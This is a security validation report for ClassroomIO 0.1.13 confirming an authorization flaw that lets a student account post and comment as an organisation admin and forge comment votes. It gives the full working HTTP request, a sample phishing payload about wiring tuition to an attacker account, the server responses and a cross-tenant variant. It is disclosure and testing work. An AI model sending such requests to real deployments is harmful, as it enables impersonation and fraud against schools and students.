# VULN-002 — Community BOLA: post/comment as any user + forged votes

**Software**: ClassroomIO
**Repository**: https://github.com/classroomio/classroomio
**Affected version**: 0.1.13 (package.json) — commit-pinned
**Target commit**: 0c356ad6f1a4d8449425b902afae58b3ebd9f443
**Status**: CONFIRMED
**Severity (static)**: Critical — CVSS 3.1 9.6 (`AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N`)
**Validated at**: 2026-09-27

## Preconditions
- One org ADMIN (the impersonation victim; the manifest admin, profile id `0419cf7a-0f8b-4797-b953-e8747cc41939`).
- One self-registered STUDENT (role 3), created via the app's own course share-link accept flow
  (`make_student`). No special privilege — a free account is enough.

## Request
Decisive request (see `request.http`) — posting AS THE ADMIN while authenticated as the STUDENT:
```
POST /community HTTP/1.1
Host: localhost:21527
Content-Type: application/json
cio-org-id: 48bbdff8-2ad5-46a3-a259-2ca3d52677dd
Cookie: classroomio.session_token=<STUDENT session>

{ "slug":"notice_<rand>", "title":"OFFICIAL: mandatory payment portal",
  "body":"Wire tuition to attacker-controlled account. marker=<rand>",
  "courseId":"<student's course>", "organizationId":"48bbdff8-...-2ca3d52677dd",
  "authorProfileId":"0419cf7a-0f8b-4797-b953-e8747cc41939", "votes":9999 }
```
Follow-up (forged comment with forged votes): `POST /community/<id>/comment`
`{ "body":"...", "authorProfileId":"<ADMIN id>", "votes":9999 }`.

## Response
`POST /community` → **HTTP 201** `{"success":true,"data":{"id":1,...}}`. `GET /community/<slug>`
→ **HTTP 200** with `authorId` = the ADMIN's id and `authorFullname":"admin"`. `POST /:id/comment`
→ **HTTP 201** with `"votes":9999` and `authorId` = the ADMIN. See `response.txt` / `run.log`.

## Observation
- DB `community_question.author_profile_id` = `0419cf7a-...` (the ADMIN) although the creating
  session was the STUDENT `138b8a33-...`. `GET /community/<slug>` renders the post authored by
  "admin". → **author spoofing / BOLA confirmed**.
- The question insert **hardcodes `votes:0`** (query `:199-221`), so the body `votes:9999` is
  silently dropped on the question — a mass-assignment field that is accepted then overridden.
- The **comment** path (`submitComment`, query `:133-155`) inserts `votes` verbatim: the forged
  comment persisted with `votes=9999` and `author_profile_id` = the ADMIN. → **vote forgery +
  author spoofing confirmed on comments**.
- Question `id` came back as `1` on a fresh DB, confirming the **sequential bigint** primary key
  the finding relies on for the comment-wipe enumeration primitive.

## Side effects
- Creates one community question + one comment per run (random slug/marker; no collisions).
  Non-destructive; leaves forged content in the org's forum.

## Research & references
- OWASP API Security Top 10 — API1:2023 Broken Object Level Authorization and API3:2023 Broken
  Object Property Level Authorization (mass assignment): the write trusts client-supplied ownership
  fields (`authorProfileId`) instead of the session identity.
- CWE-639 (Authorization Bypass Through User-Controlled Key) and CWE-915 (mass assignment).

## If FAILED
n/a — CONFIRMED.

## If NEEDS_MANUAL
Cross-tenant variants (`organizationId` of a foreign org; `GET /:slug` / `GET /?orgId=` reads of
another tenant) require a second organization (cloud/multi-tenant). Here a foreign `organizationId`
fails the FK, so only the same-org author-spoof + comment-vote-forge are exercised (the report's
"◑ spoof live"). In cloud, the identical request with a victim org's `organizationId` writes into
that tenant, and `GET /community/<victim-slug>` reads it back.
